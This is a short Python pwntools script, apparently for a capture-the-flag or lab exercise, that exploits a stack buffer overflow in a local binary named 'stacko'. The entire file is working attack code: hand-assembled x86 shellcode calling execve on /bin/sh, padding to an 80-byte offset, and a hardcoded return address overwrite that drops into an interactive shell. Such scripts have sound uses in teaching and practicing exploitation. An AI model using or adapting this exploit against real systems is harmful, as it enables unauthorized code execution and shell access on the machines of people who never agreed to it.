#! /usr/bin/env python3
from pwn import *
import struct

"""
/bin/ls
mov eax, 11
mov ebx, addr
mov ecx, 0
mov edx, 0
int 0x80
pad
addr to shellcode
"""

str_addr       = b'\xe0\xcd\xff\xff'

arg_str = b'/bin/sh\0'
arg_str_len = len(arg_str)
shellcode = arg_str + b"\xB8\x0B\x00\x00\x00\xBB" + str_addr + b"\xB9\x00\x00\x00\x00\xBA\x00\x00\x00\x00\xCD\x80"
shellcode_addr = struct.pack('I', struct.unpack('I', str_addr)[0] + arg_str_len)
shellcode_len = len(shellcode) + len(shellcode_addr)
buf_to_ret_offset = 80
shellcode_pad = buf_to_ret_offset - shellcode_len

shellcode = shellcode + b'A'*shellcode_pad + shellcode_addr

#print(len(shellcode))
#print(shellcode)
#
#with open('shellcode.bin', 'wb') as f:
#    f.write(shellcode)

p = process('./stacko')
#context.log_level = 'debug'
#gdb.attach(p, 'c')
p.sendline(shellcode)
p.recv()
p.interactive()
